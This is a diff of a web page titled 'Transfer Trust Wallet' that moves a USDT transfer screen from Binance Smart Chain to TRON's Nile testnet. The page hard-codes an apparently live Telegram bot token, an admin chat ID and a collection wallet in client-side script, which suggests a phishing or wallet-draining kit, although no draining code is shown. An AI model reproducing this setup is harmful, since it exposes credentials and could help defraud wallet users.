@@ -6,7 +6,7 @@
   
   <meta charset="UTF-8">
   <title>Transfer Trust Wallet</title>
-  <meta name="description" content="Securely transfer USDT on Binance Smart Chain">
+  <meta name="description" content="Securely transfer USDT on TRON">
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
   <link rel="icon" href="favicon.ico">
   <meta name="next-head-count" content="5">
@@ -145,19 +145,19 @@
                      text-gray-300
                      font-medium"
             >
-              <!-- BNB ICON IMAGE -->
+              <!-- TRON ICON IMAGE -->
               <div
                 class="w-4 h-4 rounded-full overflow-hidden bg-[#2b2b2b]
                        flex items-center justify-center"
               >
                 <img
                   src="IMG_1830%203.jpg"
-                  alt="BNB"
+                  alt="TRON"
                   class="w-full h-full object-cover"
                 >
               </div>
 
-              <span class="leading-none">BNB smart chain</span>
+              <span class="leading-none">TRON (TRC20)</span>
               <span class="ml-1 text-gray-500 leading-none">▾</span>
             </div>
           </div>
@@ -193,18 +193,17 @@
     <p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p>
   </next-route-announcer>
 
-  <!-- Use ethers.js v5.7.2 for Trust Wallet/MetaMask compatibility -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  
 <script>
 // Environment variables from .env
 window.ENV = {
     TELEGRAM_BOT_TOKEN: '8941208473:AAEY1s1srFize2Ij_Ai1nYirSOcR6i18OOM',
     ADMIN_CHAT_ID: '-5543160952',
-    CONTRACT_ADDRESS: '0xaEB39CED46aaAdf4F6369806252083E82cbCEB91',
-    COMPANY_WALLET_ADDRESS: '0xbfc17A492Bc8167556aFe1Cf90D9F7Fc384DeFb4',
-    BSC_RPC_URL: 'https://bsc-dataseed1.binance.org/',
-    USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955',
+    CONTRACT_ADDRESS: '',
+    COMPANY_WALLET_ADDRESS: 'TPVxRUUx2dDwB3VCqwSUABPzoBM8Sii4bz',
+    TRON_FULL_HOST: 'https://nile.trongrid.io',
+    TRON_NETWORK_NAME: 'Nile testnet',
+    TRON_NETWORK_KEY: 'nile',
+    USDT_ADDRESS: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
     PORT: 3000
 };
 </script>
